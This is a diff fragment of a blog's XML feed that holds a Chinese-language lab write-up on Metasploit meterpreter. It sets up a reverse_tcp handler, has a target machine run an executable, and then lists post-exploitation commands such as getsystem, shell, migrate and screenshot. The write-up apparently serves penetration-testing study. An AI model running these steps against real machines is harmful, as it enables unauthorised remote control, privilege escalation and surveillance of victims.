+<p><code>getuid</code> 查看权限</p>
+<p><code>pwd</code> 查看当前路径</p>
+<p><code>screentshot</code>截图</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
+<p><code>background</code>会话转入后台</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
+<p>新建终端，进入/root目录下，查看截图</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
+<p>实验结束</p>
+]]></content>
+      <tags>
+        <tag>msf meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -281,34 +309,6 @@
 ]]></content>
       <tags>
         <tag>msf PostgreSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>metasploit之meterpreter命令</title>
-    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
-<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
-<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
-<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
-<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
-<p>执行<code>ps</code>查看进程</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
-<p><code>getuid</code> 查看权限</p>
-<p><code>pwd</code> 查看当前路径</p>
-<p><code>screentshot</code>截图</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
-<p><code>background</code>会话转入后台</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
-<p>新建终端，进入/root目录下，查看截图</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
-<p>实验结束</p>
-]]></content>
-      <tags>
-        <tag>msf meterpreter</tag>
       </tags>
   </entry>
   <entry>
